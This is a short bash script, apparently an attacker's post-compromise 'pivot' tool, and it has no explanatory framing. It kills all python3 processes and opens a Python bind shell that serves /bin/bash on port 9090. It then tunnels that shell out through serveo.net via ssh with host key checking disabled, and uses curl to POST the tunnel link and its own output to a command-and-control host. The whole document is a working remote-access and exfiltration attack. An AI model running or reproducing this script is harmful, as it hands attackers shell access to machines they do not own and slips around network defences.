#!/bin/bash
C2_URL="4f6ce0d2037780f3-103-95-173-85.serveousercontent.com"

{
  echo "--- [!] EMERGENCY PIVOT: PURE PYTHON WEB SHELL ---"
  
  # 1. Kill any hung processes
  pkill -9 python3

  # 2. Start a one-liner Web Terminal on Port 9090
  # This serves a shell directly over HTTP without needing a Docker Mount
  (
    python3 -c 'import os,pty,socket;s=socket.socket();s.bind(("0.0.0.0",9090));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn("/bin/bash")'
  ) &

  # 3. Tunnel the Python Shell out via HTTPS
  (
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=15 -R 80:localhost:9090 serveo.net 2>&1 | \
    grep "Forwarding" | \
    curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
  ) &

  echo "[!] Web Shell Initiated. Watch your Mac for the Serveo link."
} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
